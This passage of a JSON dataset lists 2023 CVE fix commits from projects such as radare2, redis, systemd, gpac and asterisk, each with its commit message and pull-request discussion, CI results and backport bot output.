PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI005BUILD/ErrorLog/log_pytests.txt\n</details>\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI101BUILD/frr.xref.xz/frr.xref.xz\n\n__DejaGNU Unittests (make check) failed for Ubuntu 16.04 arm7 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI101BUILD/ErrorLog/log_pytests.txt\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI101BUILD/config.log/config.log.gz\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/CI101BUILD/config.status/config.status\n</details>\n<details>\n<summary>Redhat 9 amd64 build: Failed (click for details)</summary>\nRedhat 9 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/RH9BUILD/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for Redhat 9 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/RH9BUILD/ErrorLog/log_pytests.txt\nRedhat 9 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/RH9BUILD/config.log/config.log.gz\nRedhat 9 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/RH9BUILD/frr.xref.xz/frr.xref.xz\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\nUbuntu 18.04 ppc64le build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1804PPC64LEBUILD/frr.xref.xz/frr.xref.xz\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1804PPC64LEBUILD/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for Ubuntu 18.04 ppc64le build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1804PPC64LEBUILD/ErrorLog/log_pytests.txt\n</details>\n<details>\n<summary>Ubuntu 18.04 amd64 build: Failed (click for details)</summary>\nUbuntu 18.04 amd64 build: Unknown Log <frr.xref.xz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1804AMD64/frr.xref.xz/frr.xref.xz\nUbuntu 18.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1804AMD64/config.log/config.log.gz\nUbuntu 18.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1804AMD64/config.status/config.status\n\n__DejaGNU Unittests (make check) failed for Ubuntu 18.04 amd64 build__\n   see PyTest log at https://ci1.netdef.org/browse/FRR-PULLREQ2-10677/artifact/U1804AMD64/ErrorLog/log_pytests.txt\n</details>\n\n</details> <details><summary>Continuous Integration Result: FAILED</summary>\n\n#  Continuous Integration Result: FAILED\n\nSee below for issues.\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10688/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n### Get source / Pull Request: Successful\n### Building Stage: Successful\n### Basic Tests: Failed\n<details>\n<summary>Topotests Ubuntu 18.04 arm8 part 6: Failed (click for details)</summary>\nTopotests Ubuntu 18.04 arm8 part 6: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10688/artifact/TOPO6U18ARM8/TopotestDetails/\nTopotests Ubuntu 18.04 arm8 part 6: No useful log found\n</details>\n<details>\n<summary>Topotests debian 10 amd64 part 6: Failed (click for details)</summary>\nTopotests debian 10 amd64 part 6: Unknown Log <TopotestLogs>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10688/artifact/TOPO6DEB10AMD64/TopotestLogs/\nTopotests debian 10 amd64 part 6: Unknown Log <TopotestDetails>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10688/artifact/TOPO6DEB10AMD64/TopotestDetails/\nTopotests debian 10 amd64 part 6: No useful log found\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Topotests Ubuntu 18.04 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 1\n- Topotests Ubuntu 18.04 amd64 part 7\n- Addresssanitizer topotests part 2\n- Topotests debian 10 amd64 part 0\n- Topotests Ubuntu 18.04 arm8 part 2\n- Addresssanitizer topotests part 3\n- Topotests debian 10 amd64 part 5\n- Addresssanitizer topotests part 9\n- CentOS 7 rpm pkg check\n- Topotests Ubuntu 18.04 amd64 part 4\n- Topotests Ubuntu 18.04 amd64 part 3\n- Addresssanitizer topotests part 8\n- Topotests Ubuntu 18.04 i386 part 7\n- Topotests Ubuntu 18.04 arm8 part 8\n- Topotests Ubuntu 18.04 i386 part 2\n- Addresssanitizer topotests part 6\n- Topotests Ubuntu 18.04 i386 part 5\n- Topotests Ubuntu 18.04 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 0\n- Ubuntu 18.04 deb pkg check\n- Topotests Ubuntu 18.04 amd64 part 2\n- Topotests debian 10 amd64 part 7\n- Topotests Ubuntu 18.04 i386 part 8\n- Topotests Ubuntu 18.04 i386 part 3\n- Topotests debian 10 amd64 part 8\n- Addresssanitizer topotests part 0\n- Debian 10 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 4\n- Topotests debian 10 amd64 part 3\n- Topotests Ubuntu 18.04 amd64 part 6\n- Topotests Ubuntu 18.04 arm8 part 9\n- Debian 9 deb pkg check\n- Topotests Ubuntu 18.04 arm8 part 3\n- Addresssanitizer topotests part 4\n- Addresssanitizer topotests part 1\n- Topotests debian 10 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 4\n- Topotests debian 10 amd64 part 4\n- Topotests Ubuntu 18.04 amd64 part 9\n- Topotests Ubuntu 18.04 i386 part 9\n- Topotests debian 10 amd64 part 2\n- Topotests Ubuntu 18.04 arm8 part 7\n- Addresssanitizer topotests part 7\n- Static analyzer (clang)\n- Topotests Ubuntu 18.04 amd64 part 5\n- Ubuntu 16.04 deb pkg check\n- Ubuntu 20.04 deb pkg check\n- Addresssanitizer topotests part 5\n- Topotests debian 10 amd64 part 1\n- Topotests Ubuntu 18.04 i386 part 1\n- Topotests Ubuntu 18.04 amd64 part 8\n- Topotests Ubuntu 18.04 arm8 part 5\n- Topotests Ubuntu 18.04 arm8 part 0\n- Topotests Ubuntu 18.04 i386 part 6\n</details>\n\n</details> # Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-10698/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n @Mergifyio backport stable/8.4 stable/8.5 > backport stable/8.4 stable/8.5\n\n#### \u2705 Backports have been created\n\n<details>\n\n* [#13231 Limit scope (backport #13222)](https://github.com/FRRouting/frr/pull/13231) has been created for branch `stable/8.4`\n* [#13232 Limit scope (backport #13222)](https://github.com/FRRouting/frr/pull/13232) has been created for branch `stable/8.5`\n\n</details>\n\n\n<!---\nDO NOT EDIT\n-*- Mergify Payload -*-\n{\"command\": \"backport stable/8.4 stable/8.5\", \"conclusion\": \"success\"}\n-*- Mergify Payload End -*-\n-->",
            "pr_title_words": 2,
            "comments_words": 1814,
            "total_other_info_words": 1816
        },
        {
            "cve-id": "CVE-2023-4322",
            "commit_url": "https://github.com/radareorg/radare2/commit/ba919adb74ac368bf76b150a00347ded78b572dd",
            "commit_msg": "Fix 1byte heap oobread in the brainfuck disassembler\n\n* https://huntr.dev/bounties/06e2484c-d6f1-4497-af67-26549be9fffd/\n* Kudos to @7resp4ss for reporting",
            "commit_msg_words": 16,
            "other_info": "Fix 1byte heap oobread in the brainfuck disassembler Hi, why change this code? I want to know what will happen if this sentence is not fixed. Nothing will happen. Well, the compiler will understand that the contents of this string are not constant. But apart from that nothing else will happen",
            "pr_title_words": 8,
            "comments_words": 43,
            "total_other_info_words": 51
        },
        {
            "cve-id": "CVE-2023-25500",
            "commit_url": "https://github.com/vaadin/flow/commit/1fa4976902a117455bf2f98b191f8c80692b53c8",
            "commit_msg": "fix: log error messages\n\nLog error messages and throw more\ngeneric exceptions.",
            "commit_msg_words": 12,
            "other_info": "fix: log error messages ## Test Results\n\u205f\u2004\u2008992 files\u2004 \u00b1\u205f\u20040\u2002\u2003\u205f\u2004\u2008992 suites\u2004 \u00b10\u2002\u2003\u20021h 29m 22s [:stopwatch:](https://github.com/EnricoMi/publish-unit-test-result-action/blob/v2.7.0/README.md#the-symbols \"duration of all tests\") +39s\n6\u2008300 tests \u00b1\u205f\u20040\u2002\u20036\u2008259 [:heavy_check_mark:](https://github.com/EnricoMi/publish-unit-test-result-action/blob/v2.7.0/README.md#the-symbols \"passed tests\") \u00b10\u2002\u200341 [:zzz:](https://github.com/EnricoMi/publish-unit-test-result-action/blob/v2.7.0/README.md#the-symbols \"skipped / disabled tests\") \u00b10\u2002\u20030 [:x:](https://github.com/EnricoMi/publish-unit-test-result-action/blob/v2.7.0/README.md#the-symbols \"failed tests\") \u00b10\u2002\n6\u2008535 runs\u2006 \u2006-\u200a11\u2002\u20036\u2008489 [:heavy_check_mark:](https://github.com/EnricoMi/publish-unit-test-result-action/blob/v2.7.0/README.md#the-symbols \"passed tests\") \u2006-\u200a9\u2002\u200346 [:zzz:](https://github.com/EnricoMi/publish-unit-test-result-action/blob/v2.7.0/README.md#the-symbols \"skipped / disabled tests\") \u2006-\u200a2\u2002\u20030 [:x:](https://github.com/EnricoMi/publish-unit-test-result-action/blob/v2.7.0/README.md#the-symbols \"failed tests\") \u00b10\u2002\n\nResults for commit e13da1c6.\u2003\u00b1 Comparison against base commit 5191b6eb.\n\n[test-results]:data:application/gzip;base64,H4sIAK1feGQC/03MSw6DIBhG0a0Yxh3IG7qZhmdCqtIgjJruvWgQmXHPH74v8GFxO3hOUqLHBPYS8pC2JJVD3CpQzA6p13zcGZ7nK197MeYwROVt7/CpRmAXr8JS5f7mUoqpSSrbOUsxbdVXiZCd2ii7YNg8e5w0cV1DrgEcxFZBwwT1CmrqreWEcyIgVjMS9aEN0Qxp8PsDbJBJsxABAAA=\n\n:recycle: This comment has been updated with latest results. Kudos, SonarCloud Quality Gate passed!&nbsp; &nbsp; [![Quality Gate passed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/passed-16px.png 'Quality Gate passed')](https://sonarcloud.io/dashboard?id=vaadin_flow&pullRequest=16935)\n\n[![Bug](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug-16px.png 'Bug')](https://sonarcloud.io/project/issues?id=vaadin_flow&pullRequest=16935&resolved=false&types=BUG) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=vaadin_flow&pullRequest=16935&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=vaadin_flow&pullRequest=16935&resolved=false&types=BUG)  \n[![Vulnerability](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability-16px.png 'Vulnerability')](https://sonarcloud.io/project/issues?id=vaadin_flow&pullRequest=16935&resolved=false&types=VULNERABILITY) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=vaadin_flow&pullRequest=16935&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=vaadin_flow&pullRequest=16935&resolved=false&types=VULNERABILITY)  \n[![Security Hotspot](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot-16px.png 'Security Hotspot')](https://sonarcloud.io/project/security_hotspots?id=vaadin_flow&pullRequest=16935&resolved=false&types=SECURITY_HOTSPOT) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/security_hotspots?id=vaadin_flow&pullRequest=16935&resolved=false&types=SECURITY_HOTSPOT) [0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=vaadin_flow&pullRequest=16935&resolved=false&types=SECURITY_HOTSPOT)  \n[![Code Smell](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell-16px.png 'Code Smell')](https://sonarcloud.io/project/issues?id=vaadin_flow&pullRequest=16935&resolved=false&types=CODE_SMELL) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=vaadin_flow&pullRequest=16935&resolved=false&types=CODE_SMELL) [0 Code Smells](https://sonarcloud.io/project/issues?id=vaadin_flow&pullRequest=16935&resolved=false&types=CODE_SMELL)\n\n[![No Coverage information](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/NoCoverageInfo-16px.png 'No Coverage information')](https://sonarcloud.io/component_measures?id=vaadin_flow&pullRequest=16935) No Coverage information  \n[![No Duplication information](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/NoDuplicationInfo-16px.png 'No Duplication information')](https://sonarcloud.io/component_measures?id=vaadin_flow&pullRequest=16935) No Duplication information\n\n Hi @caalador and @caalador, when i performed cherry-pick to this commit to 2.9, i have encountered the following issue. Can you take a look and pick it manually?\n Error Message:\n Error: Command failed: git cherry-pick 43241d420f2641da1b7f1d2630ca3f4fbdf679ac\nerror: could not apply 43241d420f... fix: log error messages (#16935)\nhint: After resolving the conflicts, mark them with\nhint: \"git add/rm <pathspec>\", then run\nhint: \"git cherry-pick --continue\".\nhint: You can instead skip this commit with \"git cherry-pick --skip\".\nhint: To abort and get back to the state before \"git cherry-pick\",\nhint: run \"git cherry-pick --abort\".\n This ticket/PR has been released with Vaadin 24.2.0.alpha1 and is also targeting the upcoming stable 24.2.0 version.",
            "pr_title_words": 4,
            "comments_words": 256,
            "total_other_info_words": 260
        },
        {
            "cve-id": "CVE-2023-42298",
            "commit_url": "https://github.com/gpac/gpac/commit/16c4fafc2881112eba7051cac48f922eb2b94e06",
            "commit_msg": "fix integer overflow issue in bifs/unquantize.c:298",
            "commit_msg_words": 6,
            "other_info": "fix integer overflow issue in bifs/unquantize.c:298 thanks for the report and the fix",
            "pr_title_words": 6,
            "comments_words": 7,
            "total_other_info_words": 13
        },
        {
            "cve-id": "CVE-2023-32690",
            "commit_url": "https://github.com/DMTF/libspdm/commit/48debe26f633e3b16809255d6ca7ce18db649a13",
            "commit_msg": "Prevent undefined behavior\n\nFix #2068 in main branch.\n\nSigned-off-by: Steven Bellock <sbellock@nvidia.com>",
            "commit_msg_words": 12,
            "other_info": "Prevent undefined behavior",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2023-35847",
            "commit_url": "https://github.com/virtualsquare/picotcp/commit/eaf166009e44641e6570c576ba071217f100fd99",
            "commit_msg": "TCP: Fixed MSS size calculation. Set MSS lower bound.\n\nReported-by: \"P. Amsuo, Purdue University\"",
            "commit_msg_words": 14,
            "other_info": "Various fixes on size calculation There should be CVEs for these fixes.",
            "pr_title_words": 5,
            "comments_words": 7,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2023-0996",
            "commit_url": "https://github.com/strukturag/libheif/commit/43cce643f5ae1adedd6b731d44a7230d53b5f258",
            "commit_msg": "JS: Fix copying of strided image data.\n\nIssue reported by Eugene Lim.",
            "commit_msg_words": 12,
            "other_info": "JS: Fix copying of strided image data.",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2023-22458",
            "commit_url": "https://github.com/redis/redis/commit/16f408b1a0121cacd44cbf8aee275d69dc627f02",
            "commit_msg": "Fix range issues in ZRANDMEMBER and HRANDFIELD (CVE-2023-22458) (#11674)\n\nmissing range check in ZRANDMEMBER and HRANDIFLD leading to panic due\r\nto protocol limitations",
            "commit_msg_words": 23,
            "other_info": "Fix range issues in ZRANDMEMBER and HRANDFIELD (CVE-2023-22458) @oranagra Thank you for the incredibly prompt fix for these commands! Just checked the PR and those crashes are mitigated (and the `srandmember` does cause a hang now). Haven't gone through the code though.\r\n\r\nBTW, after this is merged, do you think the 3 crashes (#11669, #11668, #11670) would be assigned 3 cves? I'm in the middle of some research and might need some cve records. Thanks in advance :) I'll ask @yossigo to respond about opening CVEs.\r\n@yype, btw, it would have been better to report these by email see https://github.com/redis/redis/blob/unstable/SECURITY.md > I'll ask @yossigo to respond about opening CVEs. @yype, btw, it would have been better to report these by email see https://github.com/redis/redis/blob/unstable/SECURITY.md\r\n\r\nThanks! And sorry about that, I will try to follow the security reporting guideline next time. I've moved the SRANDMEMBER fix to #11685 to be next to another fix of unreleased bug that originated form the same change.\r\nand slightly improved the SETRANGE fix and test. moved part of the content of this PR to #11720 (different topics)",
            "pr_title_words": 8,
            "comments_words": 173,
            "total_other_info_words": 181
        },
        {
            "cve-id": "CVE-2023-26767",
            "commit_url": "https://github.com/liblouis/liblouis/commit/f432de31058b5a94874d47405216d07910c18a9a",
            "commit_msg": "Check the length of path before copying into dataPath\n\nSee https://lwn.net/Articles/507319/ for more background on the\nsecurity problems of strcpy.\n\nFixes #1292",
            "commit_msg_words": 22,
            "other_info": "Check the length of path before copying into dataPath Can we drop `dataPath` please? > Can we drop `dataPath` please?\r\n\r\nIsn't that a backwards-incompatible breaking change? Yes, but we have to break things every once in a while to get rid of things that don't make sense. Are you saying it doesn't make any sense because you can achieve the same thing using the search path?\r\n\r\nI'm not totally against breaking backwards compatibility, but then this should happen with a deprecation warning and in the next release. Not sure if we'd even have to go for a new major version then, i.e. version 4.x. > Are you saying it doesn't make any sense because you can achieve the same thing using the search path?\r\n\r\nYes.\r\n\r\n+1 for a deprecation warning.\r\n\r\n-1 for a new major version. We've made much bigger backward-incompatible changes that justified a new major version. Not on the API level but on the table format level. This change to the API is insignificant compared to those. > -1 for a new major version. We've made much bigger backward-incompatible changes that justified a new major version. Not on the API level but on the table format level. This change to the API is insignificant compared to those.\r\n\r\nOK, I guess your right. Feels like cheating though. It doesn't feel like cheating to me. I don't think there are any rules regarding this? Well, strictly speaking we are removing some functionality from the public API (as far as I know). And if we claim to do [semantic versioning](https://semver.org/), then I guess we should increase the major version. I don't think we (claim to) do semantic versioning. Because it does not make sense to declare an API that does not include the table format in my opinion, and because we've made several backwards incompatible changes to the table format, I can only conclude that we are not pretending to do semantic versioning.\r\n\r\nP.S.: We can always change this of course. But that also means precisely documenting the table format, and that happens to be one of the things we struggle with a lot.\r\n OK, makes sense",
            "pr_title_words": 9,
            "comments_words": 347,
            "total_other_info_words": 356
        },
        {
            "cve-id": "CVE-2023-34101",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/b53f9de9d2f8ef7d7a7c19c444b99d8642d09a89",
            "commit_msg": "Add boundary checks to the DAO input functions.",
            "commit_msg_words": 8,
            "other_info": "Add boundary checks to the DAO input function. Updated with more DAO message length checks and addressed some comments.",
            "pr_title_words": 8,
            "comments_words": 11,
            "total_other_info_words": 19
        },
        {
            "cve-id": "CVE-2023-27783",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/e831aad6d48874abab6efa37d4460da2be3ac765",
            "commit_msg": "dlt_jnpr_ether_cleanup: check subctx before cleanup",
            "commit_msg_words": 5,
            "other_info": "dlt_jnpr_ether_cleanup: check subctx before cleanup Hi,\r\nCVE-2023-27783 has been created for https://github.com/appneta/tcpreplay/issues/780, \r\nCould this be reviewed and merged anytime soon?\r\n\r\nThanks in advance I plan to work on this on the weekend. Thank you HI @fklassen \r\n\r\nCould you please confirm, Is 4.4.4 is stable version?, I can not see it Releases - https://github.com/appneta/tcpreplay/releases\r\n\r\nThanks in advance I have other fixes I want to add before releasing. Hopefully all is good by the end of next weekend. Thank you",
            "pr_title_words": 5,
            "comments_words": 73,
            "total_other_info_words": 78
        },
        {
            "cve-id": "CVE-2023-38858",
            "commit_url": "https://github.com/knik0/faad2/commit/c65ae2904192965e7c9fcafe8c1ae5fa0649eea4",
            "commit_msg": "Fix #173 (#176)\n\nDo not touch 0-th element if array in not allocated",
            "commit_msg_words": 13,
            "other_info": "Fix #173",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2023-2597",
            "commit_url": "https://github.com/eclipse-openj9/openj9/commit/6b507fa476b1b1cee727997298ca1cc4c4145102",
            "commit_msg": "Add check for string length in getCachedUTFString()\n\nSigned-off-by: Peter Shipton <Peter_Shipton@ca.ibm.com>",
            "commit_msg_words": 11,
            "other_info": "Add check for string length in getCachedUTFString() Jenkins compile alinux64 jdk17",
            "pr_title_words": 7,
            "comments_words": 4,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2023-25667",
            "commit_url": "https://github.com/tensorflow/tensorflow/commit/8dc723fcdd1a6127d6c970bd2ecb18b019a1a58d",
            "commit_msg": "Fix integer overflow for multiframe gifs.",
            "commit_msg_words": 6,
            "other_info": "Fix segfault for multiframe gifs.",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2023-4535",
            "commit_url": "https://github.com/OpenSC/OpenSC/commit/f1993dc4e0b33050b8f72a3558ee88b24c4063b2",
            "commit_msg": "myeid: fixed CID 380538  Out-of-bounds read (OVERRUN)\n\nalso fixes output buffer size checking",
            "commit_msg_words": 13,
            "other_info": "myeid: fixed CID 380538  Out-of-bounds read (OVERRUN)",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2023-33962",
            "commit_url": "https://github.com/jstachio/jstachio/commit/7b2f78377d1284df14c580be762a25af5f8dcd66",
            "commit_msg": "Fix #157 add more aggressive html5 escaping",
            "commit_msg_words": 7,
            "other_info": "Fix #157 add more aggressive html5 escaping",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2023-50446",
            "commit_url": "https://github.com/mullvad/mullvadvpn-app/commit/59126cfb4dcf278565fadf84f36ff39e89d5f9ae",
            "commit_msg": "Stronger permissions for mullvad directories\n\nSet read-only permissions for authenticated users and full-access for\nadmins for relevant mullvad directories on creation.",
            "commit_msg_words": 21,
            "other_info": "Set permissions on log directory",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2023-24820",
            "commit_url": "https://github.com/RIOT-OS/RIOT/commit/d052e2ee166e55bbdfe4c455e65dbd7e3479ebe3",
            "commit_msg": "gnrc_sixlowpan_iphc: fix integer underflow in gnrc_sixlowpan_iphc_recv()\n\n(cherry picked from commit 2709fbd827b688fe62df2c77c316914f4a3a6d4a)",
            "commit_msg_words": 11,
            "other_info": "gnrc_sixlowpan: Various hardening fixes [backport 2022.10] ### Murdock results\n\n:heavy_check_mark: [PASSED](https://ci-prod.riot-os.org/details/269929bb39cb48648e9091595a754f80)\n\ne82cab6a94fa7865162bb7ac3705d5a461b1207d tests/unittests: fix get_frame_hdr_len tests for hardened parsing\n\n|  Success  |  Failures  |  Total  |  Runtime  |\n| :-------: | :--------: | :-----: | :-------: |\n| 2006 | 0 | 2006 | 07m:46s |\n\n\n#### Artifacts\n- [Documentation preview](https://ci-prod.riot-os.org/results/269929bb39cb48648e9091595a754f80/doc-preview/)\n\n**This only reflects a subset of all builds from https://ci-prod.riot-os.org. Please refer to https://ci.riot-os.org for a complete build for now.**",
            "pr_title_words": 6,
            "comments_words": 65,
            "total_other_info_words": 71
        },
        {
            "cve-id": "CVE-2023-51713",
            "commit_url": "https://github.com/proftpd/proftpd/commit/1376d8ccc0966d1ce9a1c76b32c6a9ca61bbe67f",
            "commit_msg": "Issue #1683: Avoid an edge case when handling unexpectedly formatted input text from client, caused by quote/backslash semantics, by skipping those semantics.",
            "commit_msg_words": 22,
            "other_info": "Issue #1683: Avoid an edge case when handling unexpectedly formatted \u2026",
            "pr_title_words": 11,
            "comments_words": 0,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2023-48107",
            "commit_url": "https://github.com/zlib-ng/minizip-ng/commit/341760887456e78ed9b86b5b3008c3ddfbd96f97",
            "commit_msg": "Check for zero length path in mz_path_has_slash\n\nFix for https://github.com/zlib-ng/minizip-ng/issues/739",
            "commit_msg_words": 10,
            "other_info": "Check for zero length path in mz_path_has_slash Thank you again @pmqs!",
            "pr_title_words": 7,
            "comments_words": 4,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2023-31438",
            "commit_url": "https://github.com/systemd/systemd/commit/8d7b0958cdb505047e5a66029468b8d12b8a7add",
            "commit_msg": "journalctl: verify sealed log epochs are continuous\n\nCurrently empty epochs are not sealed. This allows an attacker to truncate\na sealed log and continue it without any problems showing when verifying the\nlog.\n\nThis partially addresses CVE-2023-31438. One way to extend this change to\naddress CVE-2023-31438 completely, would be to verify that there is exactly\none seal per epoch (and not sealing when the epoch has not ended yet).\n\nthe change also adds a journal-file flag: HEADER_COMPATIBLE_SEALED_CONTINUOUS\nthis flag indicates that a journal file is sealed continuously and decides whether\nany missing crypto epochs should trigger a warning or an error.",
            "commit_msg_words": 101,
            "other_info": "journalctl: verify sealed log epochs are continuous looks good, but i am a bit concerned about the compat with this, see comment above Good idea. I added a draft version of a `SEALED_CONTINOUS`-flag to change the error message to a warning. Thinking more closely about it: We cannot guarantee completeness for old journal files regardless of whether the epochs are continuous or not, due to the fact that journald seals an epoch prematurely when closed. Because that allows an attacker to drop the second seal, when the epoch actually ended, and claim the premature seal is the only correct one.\r\n\r\nSo I think we should drop premature sealing and then this should be the behavior:\r\nWhen not `SEALED_CONTINOUS` we should issue a warning, that we cannot guarantee consistency, unconditionally. (And for the rest of the verification, fall back to verifying the more loose constraint).\r\n\r\nWould you be fine with dropping premature sealing, that is this block:\r\nhttps://github.com/systemd/systemd/blob/1ffa5cfb38b3d30d269259c531300fc629816ea9/src/journal/managed-journal-file.c#L395\r\nor can you tell my why it is needed? I've gone ahead and removed the premature sealing. The only remaining gap is now between rotated journal files. Please rebase and squash commits. So @yuwata you do not want to do a final review and merge this, but we let it sit again until someone else picks it up? lgtm. just some minor things. An -rc1 tag has been created and a release is being prepared, so please note that PRs introducing new features and APIs will be held back until the new version has been released.",
            "pr_title_words": 7,
            "comments_words": 246,
            "total_other_info_words": 253
        },
        {
            "cve-id": "CVE-2023-0645",
            "commit_url": "https://github.com/libjxl/libjxl/commit/d95b050c1822a5b1ede9e0dc937e43fca1b10159",
            "commit_msg": "Update exif.h",
            "commit_msg_words": 2,
            "other_info": "Update exif.h Thanks for your pull request! It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n\nView this [failed invocation](https://github.com/libjxl/libjxl/pull/2101/checks?check_run_id=10863847956) of the CLA check for more information.\n\nFor the most up to date status, view the checks section at the bottom of the pull request. Thanks for the suggested change, @a-shvedov! Could you follow the instructions above from the google-cla bot?! > Thanks for the suggested change, @a-shvedov! Could you follow the instructions above from the google-cla bot?!\r\n\r\nYes, sure!",
            "pr_title_words": 2,
            "comments_words": 101,
            "total_other_info_words": 103
        },
        {
            "cve-id": "CVE-2023-0302",
            "commit_url": "https://github.com/radareorg/radare2/commit/961f0e723903011d4f54c2396e44efa91fcc74ce",
            "commit_msg": "Fix ANSI Escape Sequence Injection vulns via DWARF ##vuln\n\n* Reported by @solid-snail via huntrdev\r\n* BountyID: 583133af-7ae6-4a21-beef-a4b0182cf82e\r\n* Reproducer: dwarf_test_func_patched",
            "commit_msg_words": 21,
            "other_info": "Colorz",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2023-49786",
            "commit_url": "https://github.com/asterisk/asterisk/commit/d7d7764cb07c8a1872804321302ef93bf62cba05",
            "commit_msg": "res_rtp_asterisk.c: Check DTLS packets against ICE candidate list\n\nWhen ICE is in use, we can prevent a possible DOS attack by allowing\nDTLS protocol messages (client hello, etc) only from sources that\nare in the active remote candidates list.\n\nResolves: GHSA-hxj9-xwr8-w8pq",
            "commit_msg_words": 41,
            "other_info": "res_rtp_asterisk.c: Check DTLS packets against ICE candidate list cherry-pick-to: 18\r\ncherry-pick-to: 20\r\ncherry-pick-to: 21\r\ncherry-pick-to: certified/18.9 cherry-pick-test Successfully merged to branch master and cherry-picked to [\"18\",\"20\",\"21\",\"certified/18.9\"]",
            "pr_title_words": 8,
            "comments_words": 18,
            "total_other_info_words": 26
        },
        {
            "cve-id": "CVE-2023-41102",
            "commit_url": "https://github.com/openNDS/openNDS/commit/31dbf4aa069c5bb39a7926d86036ce3b04312b51",
            "commit_msg": "Fix - memory leak when deleting client from client list\n\nSigned-off-by: Rob White <rob@blue-wave.net>",
            "commit_msg_words": 14,
            "other_info": "V10.2.0beta",
